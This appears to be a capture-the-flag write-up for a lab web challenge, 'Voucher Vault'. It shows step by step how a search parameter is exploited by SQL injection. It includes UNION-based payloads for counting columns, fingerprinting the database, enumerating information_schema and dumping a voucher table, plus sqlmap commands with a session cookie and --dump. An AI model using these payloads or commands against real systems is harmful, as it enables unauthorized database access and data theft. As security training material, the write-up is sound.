---
title: " Webverselabs Challenge Voucher Vault SQLi  "
date: 2026-06-17 00:00:00 +0000
categories: [Webverselabs]
tags: [Webverselabs , Medium , Challenge , Web_Attacks ]
---


## Scenario : 


Redzone is a 600-employee insurance brokerage in Charlotte that launched its internal Rewards portal in early 2024 to replace the gift-card spreadsheet HR had been running since the pandemic. The contractor who built the voucher search was paid by the milestone and shipped the feature the same week the procurement team approved a new redemption tier reserved for the executive floor. The launch-week security pass was scheduled, then bumped, then quietly dropped.


## Solution : 

<img width="1402" height="782" alt="image" src="https://github.com/user-attachments/assets/59bdedbb-e013-409e-8b27-55f465b109e3" />

We're given a set of creds to start with , once we login : 

<img width="1765" height="748" alt="image" src="https://github.com/user-attachments/assets/b682d01e-c2f1-4a01-a077-9e38132058cb" />

Let's navigate the app just like a normal user would. Check different endpoints ,then we check Burp's history , we're looking for parameters mainly , to be able to inject. 

**/Dashboard :** 

Just a static page, nothing we can work with.

**/Redeem :** 

<img width="1321" height="662" alt="image" src="https://github.com/user-attachments/assets/7c7a67cd-3068-4eb0-8f05-eef1af0a70f7" />

We have the possibility to search for Vouchers , looking at Burp : 

<img width="1423" height="707" alt="image" src="https://github.com/user-attachments/assets/d031019a-e159-49f0-9487-f0c2d6afdb14" />

I tried injecting the code parameter inside the POST request but that didn't work , we couldn't cause any internal errors. 

Moving on , **/Profile** allows us to modify the email and password that we were given : 

<img width="1294" height="550" alt="image" src="https://github.com/user-attachments/assets/3a8a31dd-06fb-4bdc-8b20-53e02e0c6844" />

But this is pretty useless for us. 

Finally we have the **/Search Voucher:**

<img width="1728" height="595" alt="image" src="https://github.com/user-attachments/assets/43da6b56-bce7-4e02-8e7c-5957a66ab4e3" />

We can try and inject the q parameter , just a simple ' or " payload is enough to break the query and cause an internal error : 

<img width="1714" height="527" alt="image" src="https://github.com/user-attachments/assets/910d2754-8ada-4540-9740-38c4abc93775" />

Perfect , we're able to break the query , we can confirm that an SQLi exists if we can get rid of the error by adding another ' since this will close the query . 

<img width="1734" height="605" alt="image" src="https://github.com/user-attachments/assets/a521475a-964a-49e7-a953-832132f7d0ab" />

We see that we no longer have the error. 

Another thing we can test is : 

```sql
' OR 1=1-- - 
```

If the app is vulnerable , this should return all vouchers : 

<img width="1735" height="844" alt="image" src="https://github.com/user-attachments/assets/24ff97e1-ece4-4dc8-b7b2-dfde06ee2144" />

Yes this confirms the SQLi , i have a section in my methdology for SQLi that i will be following : 

```bash
https://elmehdilaassiri.github.io/posts/web-app-pentesting-methodology/#sqli-
```

Now first we need to identify the number of columns : 

```sql
' order by 1-- - 
```

We identify the column count using ORDER BY, incrementing the value until the query errors. ORDER BY errors when you reference a column position that doesn't exist — so if ORDER BY 6 works but ORDER BY 7 errors, the query returns 6 columns. 

We need this number because UNION requires exactly the same number of columns as the original query to work.

By the way either use order by and add numbers until you reach an error , or use 'UNION SELECT 1,2,3,... , keep adding numbers until you no longer have an error : that's the number of columns . 

```sql
' UNION SELECT 1,2-- -
```
<img width="1724" height="558" alt="image" src="https://github.com/user-attachments/assets/91252b91-a8ba-4bad-8ff2-ab75b1be9422" />

This returned an error which means the number of columns is higher . 

```sql
' UNION SELECT 1,2,3-- -
```

<img width="1779" height="813" alt="image" src="https://github.com/user-attachments/assets/d29d87db-7bba-475e-91c8-8323bb070992" />

Perfect it works at 3 , so column number is 3 , first we need to identify the DB used . 

Here we will just test a bunch of commands , and depending on whether it works or we get an error , we should be able to identify the DB used . 

```sql
' UNION SELECT @@version,2,3-- - : For MariaDB and MySQLand MSSQL . 
' UNION SELECT banner,2,3 FROM v$version-- - : For PostgreSQL 
```

<img width="1714" height="826" alt="image" src="https://github.com/user-attachments/assets/15560fab-962e-4f1e-9fcd-90345469a44c" />

This confirms that it is a MariaDB , if we check PayloadAllTheThings for payloads for MariaDB : 

```sql
# List DB : 
' UNION SELECT GROUP_CONCAT(schema_name),2,3 FROM information_schema.schemata-- -
```
<img width="1514" height="796" alt="image" src="https://github.com/user-attachments/assets/7c48b141-3dd1-4c1b-a217-54c0b60d31e5" />

We find 2 DB challapp has our flag , let's list table names of this db : 

```sql :
# List Table Names : 
' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema='chalapp'-- -
```

<img width="1552" height="846" alt="image" src="https://github.com/user-attachments/assets/635f1950-e660-4137-bb1d-eb20cb523a34" />

Then we get the column names on the Admin_Voucher table : 

```sql
' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_schema='chalapp' AND table_name='admin_vouchers'-- -
```

<img width="1504" height="827" alt="image" src="https://github.com/user-attachments/assets/da71232d-a90a-4ef1-846c-cd65a6ae42ef" />

Finally we dump the entire thing : 

```sql
' UNION SELECT GROUP_CONCAT(id,'|',code,'|',value,'|',expiry),2,3 FROM admin_vouchers-- -
```

<img width="1400" height="833" alt="image" src="https://github.com/user-attachments/assets/3cbcc367-20cd-4698-8d65-6999bc6b6ed5" />

Perfect we got our flag that way . 

Now to automate all of this, we could've used SQLmap :)

Just make sure you add the cookie since we had to login. 

```bash
python3 sqlmap.py -u https://51bb4179-4327-voucher-vault-3bf12.challenges.webverselabs-pro.com/search.php?q= --random-agent --batch --cookie="PHPSESSID=6d997fae6d56680205e3f5ab83f0af6f" --threads=10```

<img width="1721" height="645" alt="image" src="https://github.com/user-attachments/assets/ee3b816a-3683-4956-84fe-519192c1261b" />

We just let it dump everything for us :

```bash
python3 sqlmap.py -u "https://51bb4179-4327-voucher-vault-3bf12.challenges.webverselabs-pro.com/search.php?q=test" \
--cookie="PHPSESSID=6d997fae6d56680205e3f5ab83f0af6f" \
--dbms=MySQL \
--random-agent \
--batch \
--dump \
--threads=10
```

<img width="1467" height="873" alt="image" src="https://github.com/user-attachments/assets/87417300-a956-4d44-be28-e610b6105c25" />

That's it for this challenge. See you in the next one :) 

